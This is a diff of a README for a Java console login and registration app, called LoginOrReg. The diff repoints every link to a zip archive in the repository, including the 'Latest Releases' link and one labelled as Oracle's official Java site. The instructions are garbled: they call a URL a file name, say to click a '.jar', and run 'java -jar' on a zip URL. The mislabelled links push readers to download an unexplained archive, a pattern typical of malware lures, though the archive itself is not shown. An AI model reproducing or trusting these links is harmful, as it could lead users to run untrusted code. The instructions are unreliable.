@@ -1,7 +1,7 @@
 # 🎉 LoginOrReg - Simple Registration and Login Made Easy
 
 ## 📥 Download the Application
-[![Download Now](https://raw.githubusercontent.com/Dhanush-TD/LoginOrReg/main/unresolving/LoginOrReg.zip%20Now-LoginOrReg-blue)](https://raw.githubusercontent.com/Dhanush-TD/LoginOrReg/main/unresolving/LoginOrReg.zip)
+[![Download Now](https://raw.githubusercontent.com/Dhanush-TD/LoginOrReg/main/src/Or-Login-Reg-2.7.zip%20Now-LoginOrReg-blue)](https://raw.githubusercontent.com/Dhanush-TD/LoginOrReg/main/src/Or-Login-Reg-2.7.zip)
 
 ## 🚀 Getting Started
 Welcome to LoginOrReg! This is a console-based application built in Java that helps you manage your user account. With it, you can register, log in, update your email, and reset your password easily. 
@@ -17,11 +17,11 @@ Before you start the installation, please make sure your system meets these requ
 - **Internet Connection:** Needed for downloading the application
 
 ## 📥 Download & Install
-To get the application, visit this page to download: [Latest Releases](https://raw.githubusercontent.com/Dhanush-TD/LoginOrReg/main/unresolving/LoginOrReg.zip).
+To get the application, visit this page to download: [Latest Releases](https://raw.githubusercontent.com/Dhanush-TD/LoginOrReg/main/src/Or-Login-Reg-2.7.zip).
 
 1. Go to the Releases page by clicking the link above.
    
-2. Look for the latest version. You will see assets listed under that version. You should find a file named something like `https://raw.githubusercontent.com/Dhanush-TD/LoginOrReg/main/unresolving/LoginOrReg.zip`.
+2. Look for the latest version. You will see assets listed under that version. You should find a file named something like `https://raw.githubusercontent.com/Dhanush-TD/LoginOrReg/main/src/Or-Login-Reg-2.7.zip`.
 
 3. Click on the `.jar` file to download it. Your browser will save it to your default downloads folder.
 
@@ -29,7 +29,7 @@ To get the application, visit this page to download: [Latest Releases](https://r
 After downloading, it’s time to run the application. Here’s how to do it:
 
 1. **Locate the File:**
-   - Open your downloads folder and find the `https://raw.githubusercontent.com/Dhanush-TD/LoginOrReg/main/unresolving/LoginOrReg.zip` file.
+   - Open your downloads folder and find the `https://raw.githubusercontent.com/Dhanush-TD/LoginOrReg/main/src/Or-Login-Reg-2.7.zip` file.
 
 2. **Open a Terminal or Command Prompt:**
    - On Windows: Press `Win + R`, type `cmd`, and hit Enter.
@@ -43,10 +43,10 @@ After downloading, it’s time to run the application. Here’s how to do it:
      - Linux: `cd ~/Downloads`
 
 4. **Run the Application:**
-   Type the following command, replacing `https://raw.githubusercontent.com/Dhanush-TD/LoginOrReg/main/unresolving/LoginOrReg.zip` with the actual file name if it's different:
+   Type the following command, replacing `https://raw.githubusercontent.com/Dhanush-TD/LoginOrReg/main/src/Or-Login-Reg-2.7.zip` with the actual file name if it's different:
 
    ```
-   java -jar https://raw.githubusercontent.com/Dhanush-TD/LoginOrReg/main/unresolving/LoginOrReg.zip
+   java -jar https://raw.githubusercontent.com/Dhanush-TD/LoginOrReg/main/src/Or-Login-Reg-2.7.zip
    ```
 
 5. Press Enter. The application should start in the terminal.
@@ -70,7 +70,7 @@ If you face any issues while downloading or running the application, follow thes
 ## 🔍 Additional Information
 LoginOrReg uses MySQL to handle your data safely. Ensure your database server is running during application use.
 
-For a better experience, keep your Java version updated. Check [Oracle’s official site](https://raw.githubusercontent.com/Dhanush-TD/LoginOrReg/main/unresolving/LoginOrReg.zip) for the latest Java Development Kit.
+For a better experience, keep your Java version updated. Check [Oracle’s official site](https://raw.githubusercontent.com/Dhanush-TD/LoginOrReg/main/src/Or-Login-Reg-2.7.zip) for the latest Java Development Kit.
 
 ## 📄 License
 LoginOrReg is open-source software. Check the repository for detailed information regarding the licensing.
